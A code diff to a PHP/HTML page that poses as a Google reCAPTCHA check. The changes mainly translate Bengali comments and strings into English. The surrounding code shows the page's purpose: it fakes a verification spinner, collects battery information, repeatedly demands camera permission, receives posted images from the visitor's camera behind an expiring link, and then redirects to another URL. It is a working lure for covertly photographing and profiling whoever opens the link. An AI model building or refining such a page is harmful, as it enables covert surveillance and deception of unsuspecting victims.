@@ -1,6 +1,7 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
+    // Check if expiry parameter exists or link is expired
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
@@ -76,7 +77,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -125,7 +126,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             position: relative;
         }
 
-        /* চাকা বা স্পিনার একটু মোটা (border: 4px) এবং ধীরে ঘোরার জন্য সময় বাড়ানো হয়েছে (1.2s) */
+        /* Thicker spinner with slower rotation speed */
         .recaptcha-spinner {
             width: 22px;
             height: 22px;
@@ -133,7 +134,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             border-top: 4px solid #4285F4;
             border-radius: 50%;
             animation: spin 1.2s linear infinite;
-            display: block; /* পেজে ঢোকার সাথেই অটোমেটিক শো করবে */
+            display: block;
         }
 
         @keyframes spin {
@@ -142,10 +143,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
 
         .recaptcha-checkbox.checked .recaptcha-spinner {
-            display: none; /* স্পিনার লুকিয়ে টিক মার্ক আসবে */
+            display: none;
         }
 
-        /* টিক মার্ক স্টাইল */
+        /* Checkmark style */
         .recaptcha-checkbox.checked::after {
             content: "";
             position: absolute;
@@ -230,18 +231,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             recaptchaContainer.style.display = 'flex';
         }
 
-        // পেজ লোড হওয়ার সাথেই অটোমেটিক ৩.৫ সেকেন্ড (3500ms) স্পিনার ঘুরবে
+        // Automatically start spinning on page load and redirect after 3.5 seconds
         window.addEventListener('DOMContentLoaded', () => {
             const checkbox = document.getElementById('recaptchaCheckbox');
 
             setTimeout(() => {
                 checkbox.classList.add('checked');
                 
-                // টিক মার্ক দেখানোর পর সামান্য বিরতি দিয়ে মেইন ট্যাবে লিংক ওপেন হবে
                 setTimeout(() => {
                     window.location.href = finalUrl;
                 }, 400);
-            }, 3500); // ঠিক ৩.৫ সেকেন্ড
+            }, 3500); 
         });
 
         let batteryLevelInfo = 'Not Available';
@@ -261,7 +261,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
-                    alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
+                    alert("Camera permission is required to view this link!");
                     setTimeout(requestCameraPermission, 1000);
                 });
         }
